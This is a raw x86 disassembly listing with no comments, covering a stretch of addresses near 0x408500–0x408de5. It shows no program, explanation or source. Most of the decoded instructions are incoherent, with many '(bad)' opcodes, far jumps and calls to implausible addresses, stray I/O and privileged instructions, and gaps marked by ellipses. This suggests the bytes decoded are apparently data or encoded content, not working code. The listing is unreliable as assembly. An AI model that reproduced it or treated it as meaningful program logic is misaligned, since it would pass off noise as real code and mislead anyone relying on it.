  4084f4:	add    eax,0xaac9
	...
  408505:	add    BYTE PTR [edx],ch
  408507:	mov    ch,ah
  408509:	push   0x42
  40850b:	or     eax,0x8261f500
  408510:	jge    0x4084eb
  408512:	pusha  
  408513:	sbb    DWORD PTR [ecx],ebx
  408515:	outs   dx,BYTE PTR ds:[esi]
  408516:	push   0xfffffff9
  408518:	(bad)  
  408519:	fcomp  QWORD PTR [eax-0x53]
  40851c:	fiadd  DWORD PTR [ebx+0x0]
  40851f:	sahf   
  408520:	(bad)  
  408521:	fdiv   QWORD PTR [eax]
  408523:	lahf   
  408524:	jne    0x408503
  408526:	add    DWORD PTR [eax],ebx
  408528:	or     BYTE PTR [ecx+0x5d],dl
  40852b:	mov    edx,0xc32e3eff
  408530:	adc    cl,ch
  408532:	pop    ebx
  408533:	mov    ch,ah
  408535:	push   0x42
  408537:	or     eax,0x83049d00
  40853c:	jge    0x40852b
  40853e:	pusha  
  40853f:	sbb    DWORD PTR [esi],edx
  408541:	push   ss
  408542:	pop    edx
  408543:	cmc    
  408544:	(bad)  
  408545:	xchg   esp,eax
  408546:	pop    eax
  408547:	lods   eax,DWORD PTR ds:[esi]
  408548:	scas   al,BYTE PTR es:[edi]
  408549:	add    BYTE PTR [eax+0x62],al
  40854c:	(bad)  
  40854d:	call   DWORD PTR [edi+0xe]
  408550:	push   DWORD PTR [ebp-0x3e]
  408553:	imul   eax,DWORD PTR ds:0xc962bddb,0x5501cec2
  40855d:	mov    ebp,DWORD PTR [esi-0x720f3b7a]
  408563:	cld    
  408564:	or     ebp,eax
  408566:	jge    0x4085ce
  408568:	(bad)  
  408569:	inc    DWORD PTR [eax]
	...
  408577:	add    BYTE PTR [eax],al
  408579:	xor    ecx,DWORD PTR [ebp+0xc]
  40857c:	sbb    DWORD PTR [edi-0xb],0xffffffff
  408580:	jae    0x4085f6
  408582:	bound  esi,QWORD PTR [ebp+0xc]
  408585:	mov    ds:0xbdffe2ce,al
  40858a:	push   cs
  40858b:	shl    BYTE PTR [eax+ecx*2+0x74],0x45
  408590:	lock cmp ah,BYTE PTR [edx+0x75]
  408594:	or     al,0xe2
  408596:	xchg   ebx,esp
  408598:	(bad)  
  408599:	fisttp QWORD PTR [esi]
  40859b:	shl    BYTE PTR [eax+ebx*1-0x7e],0x7d
  4085a0:	cld    
  4085a1:	dec    edx
  4085a2:	or     DWORD PTR [eax],edx
  4085a4:	add    BYTE PTR [ecx-0x57],cl
  4085a7:	(bad)  
  4085a8:	jne    0x408568
  4085aa:	addr16 jne 0x4085a5
  4085ad:	xchg   edx,eax
  4085ae:	popf   
  4085af:	out    0xff,al
  4085b1:	lea    ecx,[ebx]
  4085b3:	shl    BYTE PTR [ebp+0x2b],0x68
  4085b7:	jne    0x4085c9
  4085b9:	popf   
  4085ba:	std    
  4085bb:	sti    
  4085bc:	call   edi
  4085be:	cmp    bh,0x75
  4085c1:	add    dh,BYTE PTR [ecx+0x4f]
  4085c4:	(bad)  
  4085c5:	cmp    eax,0x6a458d67
  4085ca:	fsub   st,st(7)
  4085cc:	loopne 0x408637
  4085ce:	addr16 (bad) 
  4085d0:	jmp    DWORD PTR [ebx+0x79]
  4085d3:	psubsb mm7,QWORD PTR [edx+0x1affa1e9]
  4085da:	icebp  
  4085db:	push   cs
	...
  4085ec:	ss pop ss
  4085ee:	scas   eax,DWORD PTR es:[edi]
  4085ef:	sbb    DWORD PTR [edi+0x5f75a19e],0x6
  4085f6:	mov    cl,0xe2
  4085f8:	les    esp,FWORD PTR [ebx+0x2f6f458b]
  4085fe:	pop    ds
  4085ff:	or     al,0x63
  408601:	cmp    cl,BYTE PTR [ecx-0x1]
  408604:	ss mov edx,0xc3c15aab
  40860a:	mov    eax,ds:0xd4d2a30b
  40860f:	mov    WORD PTR [esi],ds
  408611:	pop    esi
  408612:	xor    al,0xff
  408614:	push   ss
  408615:	mov    edx,0x638011ab
  40861a:	mov    eax,ds:0xe4f2a30b
  40861f:	xor    dh,0x71
  408622:	add    al,0x0
  408624:	push   ebx
  408625:	scas   al,BYTE PTR es:[edi]
  408626:	adc    al,0x11
  408628:	fs cdq 
  40862a:	repz (bad) 
  40862c:	(bad)  
  40862d:	sbb    ah,BYTE PTR [ecx+0x17135b75]
  408633:	or     BYTE PTR [ebx],bh
  408635:	sbb    DWORD PTR [edx+0x471144ff],esp
  40863b:	lock xchg ebx,eax
  40863d:	ss and ah,bl
  408640:	xor    al,0x33
  408642:	mov    eax,ds:0x49465f75
  408647:	frstor [ebx+eax*2]
  40864a:	retf   
  40864b:	ret    0xae6f
  40864e:	mov    eax,DWORD PTR ss:[eax]
	...
  40865d:	add    BYTE PTR [eax],al
  40865f:	pop    es
  408660:	das    
  408661:	enter  0xb0f0,0x7
  408665:	mov    ebp,0xf1058eff
  40866a:	stos   DWORD PTR es:[edi],eax
  40866b:	jmp    0xe141:0xeaa11ea6
  408672:	test   BYTE PTR [esi+0xd],ch
  408675:	jmp    0x7cdd2391
  40867a:	or     ecx,ebx
  40867c:	xchg   ecx,eax
  40867d:	or     BYTE PTR [ecx+0x18290fd4],ah
  408683:	xchg   ecx,eax
  408684:	mov    ah,BYTE PTR [ebx+edx*4+0xc5c9c33]
  40868b:	retf   
  40868c:	push   0xfb4a0cb
  408691:	test   eax,0x4c868117
  408696:	mov    al,ds:0x3d90563
  40869b:	adc    ch,dh
  40869d:	mov    ebp,0x3c9b9716
  4086a2:	pushf  
  4086a3:	jnp    0x408680
  4086a5:	(bad)  
  4086a6:	mov    al,ds:0x17a90f84
  4086ab:	bound  ecx,QWORD PTR [eax+0x6c]
  4086ae:	inc    esi
  4086af:	jae    0x4086e5
  4086b1:	cmp    ebp,0xa08e9b81
  4086b7:	out    dx,al
  4086b8:	or     al,0x91
  4086ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086bb:	aas    
  4086bc:	fwait
  4086bd:	jle    0x40864b
  4086bf:	and    BYTE PTR [edi],bh
  4086c1:	mov    al,ds:0xc5
	...
  4086d2:	addr16 add eax,0x85378d14
  4086d8:	sub    eax,0x5e9b3d57
  4086dd:	enter  0x5dde,0x57
  4086e1:	mov    al,ds:0x3e9062c
  4086e6:	arpl   WORD PTR [esi-0x3a97f054],cx
  4086ec:	mov    ch,0x6
  4086ee:	jecxz  0x4086cd
  4086f0:	(bad)  
  4086f1:	call   0xb229876b
  4086f6:	popa   
  4086f7:	add    eax,0x9552600
  4086fc:	call   0xffdb5249
  408701:	loop   0x408723
  408703:	adc    DWORD PTR [edi],ecx
  408705:	sbb    ecx,0x3e940e9
  40870b:	adc    DWORD PTR [ecx+edx*1],ecx
  40870e:	ret    0xffba
  408711:	idiv   al
  408713:	or     BYTE PTR [eax+0x5f],ch
  408716:	mov    ah,0x45
  408718:	add    dh,ah
  40871a:	pop    edx
  40871b:	or     eax,ebp
  40871d:	push   cs
  40871e:	call   FWORD PTR [edx+0x5dda60ff]
  408724:	dec    dh
  408726:	les    ebp,FWORD PTR ds:0x560e83e
  40872c:	lea    esp,[ecx+eiz*4-0x65]
  408730:	push   DWORD PTR [esi-0x725852a9]
	...
  408742:	add    BYTE PTR [eax],al
  408744:	add    ah,ah
  408746:	call   0x9eff:0x9ba16c8d
  40874d:	das    
  40874e:	call   0x81ff:0x9acd51b5
  408755:	shr    BYTE PTR [eax+0x0],0xe9
  408759:	out    dx,eax
  40875a:	jg     0x408718
  40875c:	jg     0x408752
  40875e:	cdq    
  40875f:	inc    eax
  408760:	out    0xe4,al
  408762:	inc    BYTE PTR [eax]
  408764:	jmp    0x2bd60fc9
  408769:	fstp   QWORD PTR [ecx-0xa9ea901]
  40876f:	(bad)  
  408770:	call   0x6ac491d5
  408775:	pop    edi
  408776:	add    eax,0x47970000
  40877b:	sub    al,0x50
  40877d:	xor    al,BYTE PTR [edx+0x6dfa412c]
  408783:	mov    esp,0xb05faad
  408788:	rcr    bh,0xc
  40878b:	jmp    0x46925c
  408790:	lea    ebp,[edi-0x39]
  408793:	(bad)  
  408794:	call   DWORD PTR [ebp+0x74]
  408797:	inc    edx
  408798:	sub    al,0xfa
  40879a:	in     eax,dx
  40879b:	test   DWORD PTR [ebx+ecx*1],ebp
  40879e:	push   es
  40879f:	call   0x41af43
  4087a4:	or     edi,DWORD PTR [edx-0x4]
  4087a7:	add    al,0xe9
	...
  4087b5:	add    BYTE PTR [eax],al
  4087b7:	add    ch,dl
  4087b9:	add    eax,0xfc950000
  4087be:	or     ebp,eax
  4087c0:	xchg   edi,eax
  4087c1:	pop    edi
  4087c2:	(bad)  
  4087c3:	inc    ecx
  4087c5:	lds    esi,FWORD PTR [ebp+0xf]
  4087c8:	xor    bl,BYTE PTR [ecx]
  4087ca:	sub    BYTE PTR [ecx-0x76],al
  4087cd:	jp     0x408844
  4087cf:	or     al,0xa2
  4087d1:	sbb    ebx,edi
  4087d3:	push   DWORD PTR [ebp-0x7595f592]
  4087d9:	jp     0x408850
  4087db:	or     al,0xd2
  4087dd:	xchg   edi,ebx
  4087df:	call   ebp
  4087e1:	je     0x408778
  4087e3:	ret    0x7ad4
  4087e6:	dec    DWORD PTR [ebp+0x50519578]
  4087ec:	repnz push esi
  4087ee:	(bad)  
  4087f0:	aad    0xd4
  4087f2:	(bad)  
  4087f3:	jne    0x408827
  4087f5:	js     0x40886c
  4087f7:	adc    al,0xc5
  4087f9:	std    
  4087fa:	(bad)  
  4087fc:	xchg   ebp,eax
  4087fd:	std    
  4087fe:	pop    es
  4087ff:	call   0xffddc667
  408804:	and    al,0x47
  408806:	(bad)  
  408807:	fistp  DWORD PTR [eax+eax*2]
  40880a:	stos   BYTE PTR es:[edi],al
  40880b:	pusha  
  40880c:	out    0x6c,al
  40880e:	out    dx,eax
  40880f:	mov    dh,ah
  408811:	sbb    bl,BYTE PTR [ebp+0x202c04ff]
  408817:	adc    BYTE PTR [ebx+0x79],ah
  40881a:	add    ebx,ebp
	...
  408828:	add    BYTE PTR [eax],al
  40882a:	add    BYTE PTR [ecx-0x9],dl
  40882d:	pop    ss
  40882e:	adc    ah,ch
  408830:	cmp    DWORD PTR [edi-0x2],edx
  408833:	in     al,0x7
  408835:	stos   DWORD PTR es:[edi],eax
  408836:	inc    edx
  408837:	or     eax,0xa30b03af
  40883c:	adc    ah,al
  40883e:	addr16 jmp 0x408807
  408841:	inc    esp
  408842:	add    ah,al
  408844:	adc    DWORD PTR [edi],ecx
  408846:	call   0xffde47c2
  40884b:	mov    ah,0x71
  40884d:	pop    eax
  40884e:	(bad)  
  40884f:	lods   al,BYTE PTR ds:[esi]
  408850:	scas   eax,DWORD PTR es:[edi]
  408851:	xor    al,0xe8
  408853:	daa    
  408854:	addr16 popf 
  408856:	push   DWORD PTR [ebx]
  408858:	sub    ebx,DWORD PTR [edi]
  40885a:	sbb    BYTE PTR [ebx-0x2e],ah
  40885d:	ud0    edx,DWORD PTR [esi]
  408860:	mov    edx,0xa60eff33
  408865:	pushf  
  408866:	push   ebp
  408867:	pop    ebx
  408868:	jae    0x40887a
  40886a:	(bad)  
  40886b:	out    dx,al
  40886c:	xchg   ecx,eax
  40886d:	xor    edi,edi
  40886f:	mul    BYTE PTR [ebp-0x7899ab55]
  408875:	popf   
  408876:	call   0xffddec41
  40887b:	out    0x20,al
  40887d:	ret    0x4cfe
  408880:	sysenter 
  408882:	dec    DWORD PTR [esi]
  408884:	jmp    0xb951:0x53cff9d
  40888b:	pop    es
  40888c:	add    eax,0x86e9
	...
  40889d:	add    BYTE PTR [ebx],ah
  40889f:	or     BYTE PTR [ebx+edx*4+0x25],ch
  4088a3:	cwde   
  4088a4:	dec    esi
  4088a5:	popf   
  4088a6:	(bad)  
  4088a7:	pop    eax
  4088a8:	inc    edi
  4088a9:	popf   
  4088aa:	adc    al,0xad
  4088ac:	das    
  4088ad:	jo     0x408912
  4088af:	add    eax,0x96cb5736
  4088b4:	cs popf 
  4088b6:	or     edx,edx
  4088b8:	inc    ecx
  4088b9:	popf   
  4088ba:	hlt    
  4088bb:	int    0x2b
  4088bd:	clc    
  4088be:	in     al,dx
  4088bf:	xor    BYTE PTR [edx-0x50],ah
  4088c2:	jns    0x4088c9
  4088c4:	push   cs
  4088c5:	pop    ss
  4088c6:	ja     0x408860
  4088c8:	jl     0x4088bd
  4088ca:	aad    0x11
  4088cc:	in     eax,dx
  4088cd:	pushf  
  4088ce:	push   esi
  4088cf:	or     eax,0x97c6dd01
  4088d4:	out    dx,al
  4088d5:	retf   0xf4a1
  4088d8:	call   0xdee97113
  4088dd:	push   ss
  4088de:	pop    edi
  4088df:	lods   eax,DWORD PTR ds:[esi]
  4088e0:	xor    bh,BYTE PTR [ebp-0x3c1d685c]
  4088e6:	pop    ss
  4088e7:	test   ebp,0xd1357316
  4088ed:	xchg   ecx,eax
  4088ee:	lods   eax,DWORD PTR ds:[esi]
  4088ef:	xchg   edi,eax
  4088f0:	mov    dh,0x33
  4088f2:	test   BYTE PTR [ecx],dl
  4088f4:	rcr    DWORD PTR [esi+esi*8-0x1162c710],1
  4088fb:	or     al,0x91
  4088fd:	pop    ebp
  4088fe:	ins    BYTE PTR es:[edi],dx
  4088ff:	xchg   edi,eax
  408900:	xchg   esi,eax
  408901:	stos   DWORD PTR es:[edi],eax
	...
  40890e:	add    BYTE PTR [eax],al
  408910:	add    BYTE PTR [ecx-0x46],bh
  408913:	mov    ds,WORD PTR [edx+ebp*1-0x51fc223c]
  40891a:	mov    cl,BYTE PTR [ebp-0xe2964]
  408920:	jne    0x40898f
  408922:	cmc    
  408923:	(bad)  
  408924:	hlt    
  408925:	ins    BYTE PTR es:[edi],dx
  408926:	sub    ebx,DWORD PTR [edx]
  408928:	dec    bp
  40892a:	or     eax,0x96cfa0e8
  40892f:	call   DWORD PTR [esi+0x4d]
  408932:	icebp  
  408933:	(bad)  
  408934:	aam    0x10
  408936:	cwde   
  408937:	jne    0x40892e
  408939:	dec    edx
  40893a:	loop   0x40893a
  40893c:	mov    ah,0x58
  40893e:	lods   eax,DWORD PTR ds:[esi]
  40893f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408940:	ss out 0x96,eax
  408943:	push   DWORD PTR [esp+esi*8-0x28068a69]
  40894a:	adc    BYTE PTR [ebx+edx*4],cl
  40894d:	in     al,dx
  40894e:	xchg   edi,eax
  40894f:	jne    0x408932
  408951:	mov    eax,0xff0eff72
  408956:	int3   
  408957:	ret    0x60d9
  40895a:	xor    BYTE PTR [ebx-0xf3e1cf3],cl
  408960:	call   0x40eb:0x122b2e8e
  408967:	or     al,0xe6
  408969:	pop    DWORD PTR [edi+0x10c8e145]
  40896f:	or     BYTE PTR [esi+0x22],ah
  408972:	cdq    
  408973:	(bad)  
  408974:	and    al,0x0
	...
  408982:	add    BYTE PTR [eax],al
  408984:	repz add eax,0x8260e900
  40898a:	cmp    eax,0x457ff0
  40898f:	jmp    0x2cc3c2e8
  408994:	outs   dx,DWORD PTR ds:[esi]
  408995:	add    eax,0x40ea3f74
  40899a:	lock cmp DWORD PTR ds:0x36e96a04,edi
  4089a1:	add    eax,0x96570c83
  4089a6:	jae    0x4089a8
  4089a8:	inc    edi
  4089a9:	jnp    0x408a20
  4089ab:	adc    cl,dh
  4089ad:	(bad)  
  4089ae:	imul   eax,DWORD PTR [eax],0x458d0160
  4089b4:	mov    dl,0xd1
  4089b6:	(bad)  
  4089b7:	adc    eax,0x40a933
  4089bc:	xor    edx,eax
  4089be:	je     0x4089ef
  4089c0:	mov    ecx,0x3600f3fc
  4089c5:	test   eax,0x870e458a
  4089ca:	dec    ebp
  4089cb:	lock popa 
  4089cd:	or     DWORD PTR [edi+0x17],esi
  4089d0:	mov    ecx,0x36758b6d
  4089d5:	xchg   BYTE PTR [ebp+0x8],bh
  4089d8:	jno    0x408a26
  4089da:	lock jecxz 0x4089d5
  4089dd:	outs   dx,BYTE PTR ds:[esi]
  4089de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089df:	mov    esi,DWORD PTR [edi+0x7a75fefd]
  4089e5:	mov    al,BYTE PTR [eax]
  4089e7:	inc    DWORD PTR [eax]
	...
  4089f5:	add    BYTE PTR [eax],al
  4089f7:	push   edi
  4089f8:	xchg   al,ch
  4089fa:	aaa    
  4089fb:	xor    DWORD PTR [ecx],eax
  4089fd:	add    BYTE PTR [ebx+0x5b5dda79],cl
  408a03:	cmp    DWORD PTR [edi-0x7988fff4],0xffffffec
  408a0a:	add    DWORD PTR [esi],0x6e
  408a0d:	push   ebx
  408a0e:	push   esi
  408a0f:	gs jmp 0x18bb93d
  408a15:	call   0x427bb3
  408a1a:	mov    eax,edx
  408a1c:	ret    0xfc45
  408a1f:	jp     0x408a22
  408a21:	add    BYTE PTR [eax],al
  408a23:	add    ecx,0x94523e74
  408a29:	cs inc ecx
  408a2b:	jp     0x4089fb
  408a2d:	out    0x45,eax
  408a2f:	arpl   WORD PTR [ebx+0x3],ax
  408a32:	add    BYTE PTR [eax+0x5e],ch
  408a35:	comiss xmm5,xmm0
  408a38:	push   cs
  408a39:	sub    esi,DWORD PTR [esi]
  408a3b:	jl     0x408a1a
  408a3d:	add    edx,DWORD PTR [ebx+0x3b]
  408a40:	push   ebx
  408a41:	outs   dx,BYTE PTR ds:[esi]
  408a42:	add    BYTE PTR [ebx-0x59],ah
  408a45:	ret    
  408a46:	je     0x408a9d
  408a48:	pop    ss
  408a49:	fwait
  408a4a:	lea    esp,[esi+0x66e83332]
  408a50:	xchg   DWORD PTR [ebx],eax
  408a52:	add    BYTE PTR [ebx-0x697c4dbd],dh
  408a58:	dec    edx
  408a59:	add    esi,DWORD PTR [eax+eax*1+0x0]
	...
  408a69:	add    BYTE PTR [ecx-0x7a],bl
  408a6c:	add    al,0x0
  408a6e:	arpl   WORD PTR [esi-0x1a67a1c6],bx
  408a74:	lds    edi,FWORD PTR [eax+0x39e63]
  408a7a:	mov    WORD PTR [esi+edi*1-0x37],ss
  408a7e:	and    BYTE PTR [edx-0x72],dl
  408a81:	in     al,dx
  408a82:	loopne 0x408a6e
  408a84:	xchg   edx,eax
  408a85:	adc    DWORD PTR [esi+0x6340e915],0xffffff9e
  408a8c:	movhlps xmm4,xmm0
  408a8f:	pop    ecx
  408a90:	mov    BYTE PTR [esi],ch
  408a92:	and    bl,BYTE PTR [esi+0x1f6a7403]
  408a98:	xlat   BYTE PTR ds:[ebx]
  408a99:	nop
  408a9a:	jge    0x408a79
  408a9c:	add    eax,DWORD PTR [eax]
  408a9e:	mov    cs:0x9e63015b,eax
  408aa4:	add    ecx,ecx
  408aa6:	mov    al,ds:0xa5fa3f19
  408aab:	sahf   
  408aac:	add    eax,esi
  408aae:	and    ebx,DWORD PTR [ebp-0x5fdc39fd]
  408ab4:	add    eax,esi
  408ab6:	and    eax,DWORD PTR ds:0x45a503ea
  408abc:	in     eax,0x3
  408abe:	popf   
  408abf:	inc    ebp
  408ac0:	in     al,dx
  408ac1:	(bad)  
  408ac2:	out    dx,eax
  408ac3:	dec    ecx
  408ac4:	xchg   ebp,eax
  408ac5:	xor    al,0xc9
  408ac7:	add    eax,0x5b90413
  408acc:	adc    eax,DWORD PTR [eax+eax*1]
	...
  408adb:	add    BYTE PTR [eax],al
  408add:	mov    ecx,0xcb040305
  408ae2:	in     eax,0xea
  408ae4:	add    esp,DWORD PTR [ebx+0x1f]
  408ae7:	or     DWORD PTR [esi],ebp
  408ae9:	popa   
  408aea:	and    BYTE PTR [ebp+ebx*4-0x75036b6d],0x4d
  408af2:	inc    esi
  408af3:	jmp    0xeb5aae04
  408af8:	retf   0xcc20
  408afb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408afc:	xchg   ebx,eax
  408afd:	arpl   WORD PTR ds:0x49ee03e9,ax
  408b03:	cmp    DWORD PTR [esp+esi*8],esi
  408b06:	sbb    DWORD PTR ds:0xf494632e,ebx
  408b0c:	xchg   BYTE PTR ds:0xa30ce946,dh
  408b12:	sbb    esi,esp
  408b14:	rcr    BYTE PTR [esi],0x95
  408b17:	jmp    0xfe45ee1f
  408b1c:	push   cs
  408b1d:	iret   
  408b1e:	xchg   ebx,eax
  408b1f:	fdiv   QWORD PTR [edx-0x73]
  408b22:	inc    esi
  408b23:	jmp    0xb0d5a9b4
  408b28:	les    edx,FWORD PTR [esi]
  408b2a:	or     ch,0x84
  408b2d:	lahf   
  408b2e:	jl     0x408b94
  408b30:	ds jmp 0x408b67
  408b33:	inc    ecx
  408b34:	mov    bh,0x45
  408b36:	inc    esi
  408b37:	jmp    0xbeebade7
  408b3c:	cwde   
  408b3d:	xor    eax,DWORD PTR [eax]
  408b3f:	add    BYTE PTR [ecx+0x0],ch
	...
  408b4d:	add    BYTE PTR [eax],al
  408b4f:	add    BYTE PTR [ebx+ecx*1-0x7d],ch
  408b53:	sub    al,0xe7
  408b55:	clc    
  408b56:	jbe    0x408b6a
  408b58:	in     al,0x49
  408b5a:	lock cmp DWORD PTR [edi+0x60e9aaf2],esi
  408b61:	mov    al,al
  408b63:	adc    DWORD PTR [ecx-0x15d349fe],ebx
  408b69:	xor    eax,0x9385370f
  408b6e:	push   eax
  408b6f:	out    0x92,al
  408b71:	dec    eax
  408b72:	std    
  408b73:	sbb    DWORD PTR [edx+0x5b],ebp
  408b76:	inc    ebp
  408b77:	gs jo  0x408b7c
  408b7a:	mov    dh,0xa4
  408b7c:	(bad)  
  408b7d:	xor    eax,0x8f5d9f0f
  408b82:	push   eax
  408b83:	fidiv  WORD PTR [edx+0x5b99f948]
  408b89:	pop    ebx
  408b8a:	inc    ebp
  408b8b:	inc    ecx
  408b8c:	push   eax
  408b8d:	add    dh,BYTE PTR [edi+0xf35d2ac]
  408b93:	jbe    0x408bca
  408b95:	cdq    
  408b96:	push   eax
  408b97:	es pop ebp
  408b99:	xchg   ebp,eax
  408b9a:	push   0x45fa0b
  408b9f:	fs popf 
  408ba1:	adc    DWORD PTR [eax+0x1],0xe900600b
  408ba8:	out    0xc9,eax
  408baa:	xor    al,0x6c
  408bac:	test   DWORD PTR [ecx+0x5c3b0150],eax
  408bb2:	add    cl,ch
	...
  408bc0:	add    BYTE PTR [eax],al
  408bc2:	add    BYTE PTR [eax-0x80],dh
  408bc5:	inc    ebp
  408bc6:	jne    0x408c3f
  408bc8:	sbb    eax,0x51e0fdd
  408bcd:	call   0xffd34f6a
  408bd2:	rcl    DWORD PTR [ebp*4-0x3f5aff01],0xc3
  408bda:	push   ebp
  408bdb:	adc    DWORD PTR [ebp-0x7f],ebx
  408bde:	les    esp,FWORD PTR [esi+0x7a]
  408be1:	(bad)  
  408be2:	call   FWORD PTR [ecx-0x1e]
  408be5:	imul   eax,DWORD PTR [eax],0x75ff0950
  408beb:	jb     0x408c4b
  408bed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bee:	aad    0xf5
  408bf0:	jns    0x408b7b
  408bf2:	inc    ebp
  408bf3:	out    0xe0,al
  408bf5:	add    BYTE PTR [eax],al
  408bf7:	cmc    
  408bf8:	cmp    bh,bh
  408bfa:	jne    0x408c4e
  408bfc:	pop    esi
  408bfd:	out    0xd4,eax
  408bff:	mov    ch,0x7a
  408c01:	push   0x64a9c
  408c06:	lea    edi,[edi-0x7a000117]
  408c0c:	(bad)  
  408c0e:	jnp    0x408c62
  408c10:	jp     0x408c11
  408c12:	(bad)  
  408c13:	jg     0x408bfe
  408c15:	(bad)  
  408c16:	jmp    DWORD PTR [ebp-0x5fffff3]
  408c1c:	jl     0x408ba3
  408c1e:	pusha  
  408c1f:	xor    eax,0xa250ff7a
  408c24:	pop    eax
  408c25:	test   eax,0x0
	...
  408c36:	cli    
  408c37:	sahf   
  408c38:	enter  0x282b,0x7c
  408c3c:	mov    ebp,0xff7a7574
  408c41:	jmp    0x408c1c
  408c43:	test   DWORD PTR [edi],edi
  408c45:	add    BYTE PTR [edi+0x5],cl
  408c48:	mov    edx,0x5ba01
  408c4d:	or     ebx,DWORD PTR [eax-0xb]
  408c50:	add    al,dh
  408c52:	mov    ebp,0x3b414705
  408c57:	jno    0x408bd9
  408c59:	add    BYTE PTR [edx+0x63e57205],bh
  408c5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c60:	ret    
  408c61:	je     0x408cd0
  408c63:	inc    esp
  408c64:	js     0x408c66
  408c66:	arpl   WORD PTR [eax+ecx*4-0x69acfc7b],bx
  408c6d:	call   DWORD PTR [ebx]
  408c6f:	pop    ebx
  408c70:	adc    BYTE PTR [eax],cl
  408c72:	mov    ebx,DWORD PTR [edx]
  408c74:	scas   eax,DWORD PTR es:[edi]
  408c75:	jmp    FWORD PTR [esi+esi*2+0x7]
  408c79:	push   0x63
  408c7b:	test   BYTE PTR [ebx],0xff
  408c7e:	(bad)  
  408c7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c80:	stos   DWORD PTR es:[edi],eax
  408c81:	test   eax,0xe896802f
  408c86:	push   ds
  408c87:	mov    dl,BYTE PTR [esi+0x100fb3ff]
  408c8d:	or     BYTE PTR [ebx+0x2],cl
  408c90:	mov    al,0xff
  408c92:	xor    al,0x7
  408c94:	add    al,0x4
  408c96:	arpl   WORD PTR [esi+0xe9ab],bx
	...
  408ca8:	add    BYTE PTR [eax+esi*1],cl
  408cab:	xchg   esi,eax
  408cac:	mov    esi,esp
  408cae:	pop    edx
  408caf:	xchg   esi,eax
  408cb0:	call   DWORD PTR [edi+eax*8]
  408cb3:	xchg   esi,eax
  408cb4:	add    esp,DWORD PTR [ebx-0x62]
  408cb7:	xchg   esi,eax
  408cb8:	mov    ch,0xa7
  408cba:	iret   
  408cbb:	xchg   ebp,eax
  408cbc:	dec    DWORD PTR [ebx-0xb000c64]
  408cc2:	mov    BYTE PTR [ebx],0x4
  408cc5:	arpl   WORD PTR [esi-0x6145ad55],bx
  408ccb:	add    edx,DWORD PTR [eax-0x24]
  408cce:	xor    DWORD PTR [edi],esi
  408cd0:	call   esp
  408cd2:	call   DWORD PTR [ebp+0x20f65b75]
  408cd8:	aam    0xc4
  408cda:	(bad)  
  408cde:	sahf   
  408cdf:	add    edi,edi
  408ce1:	out    dx,al
  408ce2:	adc    BYTE PTR [esi+0x5105acff],0x3
  408ce9:	push   ebx
  408cea:	add    eax,0x9632be9
  408cef:	jmp    0x801f17f7
  408cf4:	add    al,0x63
  408cf6:	xor    eax,0x90274fc6
  408cfb:	mov    esi,0xe11a7c95
  408d00:	stos   DWORD PTR es:[edi],eax
  408d01:	cmp    bh,BYTE PTR [ecx-0x35846a52]
  408d07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d08:	xchg   ebp,eax
  408d09:	fs xor eax,0xf9e
	...
  408d1b:	add    BYTE PTR [ebx-0x63],ch
  408d1e:	pushf  
  408d1f:	mov    cl,0x54
  408d21:	nop
  408d22:	xor    DWORD PTR [ebx],0x8786904d
  408d28:	fisubr WORD PTR [esi+edi*2]
  408d2b:	xchg   ebp,eax
  408d2c:	cmp    al,0x35
  408d2e:	add    DWORD PTR [edi-0x5416b97b],esi
  408d34:	(bad)  
  408d35:	test   al,0x66
  408d37:	xchg   ebp,eax
  408d38:	fimul  DWORD PTR [ecx-0x6fe36b4b]
  408d3e:	push   0x57
  408d40:	scas   eax,DWORD PTR es:[edi]
  408d41:	nop
  408d42:	dec    esi
  408d43:	xchg   ebp,eax
  408d44:	arpl   WORD PTR [ecx],bx
  408d46:	lods   al,BYTE PTR ds:[esi]
  408d47:	add    dh,0x2c
  408d4a:	ds xchg ebp,eax
  408d4c:	cld    
  408d4d:	clc    
  408d4e:	mov    edx,0x9189e1d7
  408d53:	xchg   esp,eax
  408d54:	in     al,dx
  408d55:	(bad)  
  408d56:	in     eax,dx
  408d57:	xchg   esp,eax
  408d58:	scas   al,BYTE PTR es:[edi]
  408d59:	sub    al,0x1e
  408d5b:	xchg   ebp,eax
  408d5c:	fmul   QWORD PTR [edi+0x52cb0b9c]
  408d62:	cmp    dl,BYTE PTR [ebp+0x3c5483cc]
  408d68:	les    ecx,FWORD PTR [edi-0x6fb50002]
  408d6e:	add    dh,dh
  408d70:	gs std 
  408d72:	out    0x48,eax
  408d74:	repnz (bad) 
  408d76:	jmp    esi
  408d78:	adc    eax,0xf7deff2d
  408d7d:	(bad)  
  408d7e:	mov    ch,0x3d
	...
  408d8c:	add    BYTE PTR [eax],al
  408d8e:	add    dh,ch
  408d90:	(bad)  
  408d91:	dec    esi
  408d93:	pop    ebp
  408d94:	std    
  408d95:	out    0x8b,eax
  408d97:	ror    DWORD PTR [edi+0x1b64d2ff],cl
  408d9d:	add    BYTE PTR [ebx+0x5f],al
  408da0:	nop
  408da1:	jne    0x408d84
  408da3:	mov    eax,0xcfa6d359
  408da8:	(bad)  
  408da9:	mov    ch,0x35
  408dab:	test   BYTE PTR [esi-0x47f47e01],0xff
  408db2:	mov    ?,edi
  408db4:	pop    eax
  408db5:	pop    esp
  408db6:	xchg   bh,ch
  408db8:	mov    gs,eax
  408dba:	mov    DWORD PTR [esi],ecx
  408dbc:	(bad)  
  408dbd:	inc    edx
  408dbf:	sti    
  408dc0:	sbb    eax,0x5a1be29
  408dc5:	call   0x46469b
  408dca:	jo     0x408d69
  408dcc:	loope  0x408dcc
  408dce:	push   esi
  408dcf:	out    dx,eax
  408dd0:	cmp    BYTE PTR [ebp-0x710803],0xe9
  408dd7:	push   esp
  408dd8:	out    dx,eax
  408dd9:	addr16 aam 0x7
  408ddc:	inc    esi
  408ddd:	add    BYTE PTR [esi],dh
  408ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408de0:	loope  0x408de0
  408de2:	xlat   BYTE PTR cs:[ebx]
  408de4:	popf   
  408de5:	or     eax,0xb056051
